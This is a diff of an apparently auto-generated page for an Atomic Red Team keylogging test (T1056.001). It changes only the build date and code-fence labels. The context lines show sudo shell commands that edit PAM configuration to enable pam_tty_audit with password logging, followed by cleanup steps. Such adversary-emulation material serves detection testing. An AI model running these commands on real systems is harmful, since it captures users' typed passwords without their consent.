@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1056.001"
 attack_technique_name: "Input Capture: Keylogging"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "9c6bdb34-a89f-4b90-acb1-5970614c711b"
@@ -47,13 +47,13 @@ Checking if pam_tty_audit.so is installed
 
 ### Prerequisite Check
 
-```text
+```untitled
 test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo "Sorry, you must install module pam_tty_audit.so and recompile, for this test to work"
 ```
 
@@ -64,7 +64,7 @@ echo "Sorry, you must install module pam_tty_audit.so and recompile, for this te
 
 ### Command
 
-```sh
+```bash
 if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
 if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
 sudo touch /tmp/password-auth.bk
@@ -75,7 +75,7 @@ enable=* log_password" >> /etc/pam.d/system-auth
 
 ### Cleanup
 
-```sh
+```bash
 sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
 sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
 ```
